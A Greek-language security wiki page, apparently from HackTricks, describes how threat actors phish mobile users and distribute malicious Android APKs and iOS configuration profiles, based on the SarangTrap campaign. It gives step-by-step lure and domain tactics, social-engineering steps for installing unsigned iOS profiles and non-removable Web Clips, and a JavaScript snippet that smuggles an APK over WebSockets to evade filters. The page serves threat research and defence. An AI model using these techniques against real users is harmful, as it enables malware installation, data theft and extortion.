# Phishing μέσω κινητών & Διανομή Malicious Apps (Android & iOS)

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν threat actors για τη διανομή **malicious Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps κ.λπ.).
> Το υλικό είναι προσαρμοσμένο από την καμπάνια SarangTrap, την οποία αποκάλυψαν τα Zimperium zLabs (2025), καθώς και από άλλη δημόσια έρευνα.<sup>[[1]](#references)</sup>

## Ροή Επίθεσης

1. **SEO/Phishing Infrastructure**
* Καταχωρίστε δεκάδες look-alike domains (dating, cloud share, car service…).
– Χρησιμοποιήστε keywords στην τοπική γλώσσα και emojis στο στοιχείο `<title>` για υψηλότερη κατάταξη στο Google.
– Φιλοξενήστε οδηγίες εγκατάστασης τόσο για Android (`.apk`) όσο και για iOS στην ίδια landing page.
2. **First Stage Download**
* Android: άμεσο link σε *unsigned* APK ή APK από “third-party store”.
* iOS: `itms-services://` ή απλό HTTPS link σε malicious **mobileconfig** profile (δείτε παρακάτω).
3. **Android Post-install Behaviour**
* Η εκτέλεση που ελέγχεται από C2, η κατάχρηση permissions, τα dropper bypasses, η συλλογή δεδομένων στο background και άλλες post-install malware συμπεριφορές καλύπτονται στη dedicated σελίδα Android Malware Post-Exploitation παρακάτω.
4. **iOS Delivery Technique**
* Ένα single **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγράψει τη συσκευή σε επίβλεψη τύπου “MDM”.
* Οδηγίες social engineering:
1. Ανοίξτε τις Ρυθμίσεις ➜ *Profile downloaded*.
2. Πατήστε *Install* τρεις φορές (screenshots στη phishing page).
3. Εμπιστευτείτε το unsigned profile ➜ ο attacker αποκτά entitlement για *Contacts* και *Photo* χωρίς έλεγχο από το App Store.
5. **iOS Web Clip Payload (phishing app icon)**
* Τα `com.apple.webClip.managed` payloads μπορούν να **καρφιτσώσουν ένα phishing URL στην Home Screen** με branded icon/label.
* Τα Web Clips μπορούν να εκτελούνται σε **full-screen** (κρύβοντας το UI του browser) και να επισημανθούν ως **non-removable**, αναγκάζοντας το θύμα να διαγράψει το profile για να αφαιρέσει το icon.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Απλό HTTP, συχνά στη θύρα 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εντοπίζεται εύκολα).

## Android Malware Post-Exploitation

Για Android malware tradecraft μετά την εγκατάσταση, όπως C2, κατάχρηση Accessibility, overlays, ATS automation, staged DEX loading, premium SMS και persistence, δείτε:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Οι attackers αντικαθιστούν όλο και περισσότερο τα static APK links με ένα κανάλι Socket.IO/WebSocket ενσωματωμένο σε lures που μοιάζουν με Google Play. Αυτό αποκρύπτει το payload URL, παρακάμπτει URL/extension filters και διατηρεί ένα ρεαλιστικό install UX.<sup>[[2]](#references)[[4]](#references)</sup>

Typical client flow που παρατηρείται στην πράξη:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Γιατί παρακάμπτει τους απλούς ελέγχους:
- Δεν εκτίθεται κανένα στατικό APK URL· το payload ανακατασκευάζεται στη μνήμη από WebSocket frames.
- Τα URL/MIME/extension filters που αποκλείουν άμεσες αποκρίσεις .apk ενδέχεται να μην ανιχνεύσουν binary data που διοχετεύονται μέσω WebSockets/Socket.IO.
- Crawlers και URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης το WebSocket tradecraft και τα εργαλεία:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Η σκοτεινή πλευρά του έρωτα: Εκστρατεία εκβιασμού SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ρυθμίσεις payload Web Clips για συσκευές Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan με στόχο χρήστες Android στην Ινδονησία και το Βιετνάμ](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
